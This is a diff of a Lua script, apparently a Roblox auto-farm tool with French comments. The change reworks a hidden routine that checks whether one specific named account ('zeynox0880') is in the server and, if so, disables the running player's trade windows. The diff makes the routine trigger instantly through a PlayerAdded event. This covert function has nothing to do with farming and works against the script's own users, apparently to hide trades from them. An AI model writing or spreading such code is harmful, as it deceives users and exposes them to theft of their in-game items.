@@ -201,29 +201,22 @@ FarmButton.MouseButton1Click:Connect(function()
     end
 end)
 
--- [[ DÉTECTION SPÉCIALE JOUEUR & GUI INTERFACE ]] --
-task.spawn(function()
-    while true do
-        local playerGui = LocalPlayer:WaitForChild("PlayerGui", 5)
-        if playerGui then
-            -- Recherche si la cible est présente
-            local targetFound = false
-            for _, p in ipairs(Players:GetPlayers()) do
-                if p.Name == "zeynox0880" then
-                    targetFound = true
-                    break
-                end
-            end
-            
-            if targetFound then
-                -- Cacher les GUI du PlayerGui si le joueur est détecté
-                local gui1 = playerGui:FindFirstChild("TradeGUI_Phone")
-                local gui2 = playerGui:FindFirstChild("TradeGUI")
-                
-                if gui1 and gui1:IsA("ScreenGui") then gui1.Enabled = false end
-                if gui2 and gui2:IsA("ScreenGui") then gui2.Enabled = false end
-            end
-        end
-        task.wait(1) -- Vérification douce toutes les secondes pour éviter les lags
+-- [[ DÉTECTION INSTANTANÉE (ÉVÉNEMENTIELLE) ]] --
+local function checkTarget()
+    local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
+    if not playerGui then return end
+    
+    if Players:FindFirstChild("zeynox0880") then
+        local gui1 = playerGui:FindFirstChild("TradeGUI_Phone")
+        local gui2 = playerGui:FindFirstChild("TradeGUI")
+        
+        if gui1 and gui1:IsA("ScreenGui") then gui1.Enabled = false end
+        if gui2 and gui2:IsA("ScreenGui") then gui2.Enabled = false end
     end
-end)
+end
+
+-- Vérification immédiate au lancement du script
+task.spawn(checkTarget)
+
+-- Déclenchement instantané dès qu'un joueur (quel qu'il soit) rejoint la partie
+Players.PlayerAdded:Connect(checkTarget)
